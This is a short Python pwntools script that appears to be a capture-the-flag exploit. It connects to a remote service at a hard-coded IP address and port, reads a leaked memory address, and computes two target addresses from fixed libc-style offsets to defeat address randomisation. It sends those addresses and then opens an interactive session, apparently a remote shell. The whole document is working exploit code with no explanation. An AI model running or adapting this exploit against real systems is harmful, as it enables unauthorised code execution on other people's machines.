from pwn import *

proc = remote("109.233.56.90", 11633)
s = proc.recvline().split()[1][2:]
print(s)
send1 = hex(int(s, 16) - int("0000000000027700", 16) + int("000000000004c920", 16))[2:]
send2 = hex(int(s, 16) - int("0000000000027700", 16) +  int("19604f", 16))[2:]
input()
proc.sendline(send1.encode())
proc.sendline(send2.encode())
proc.interactive()
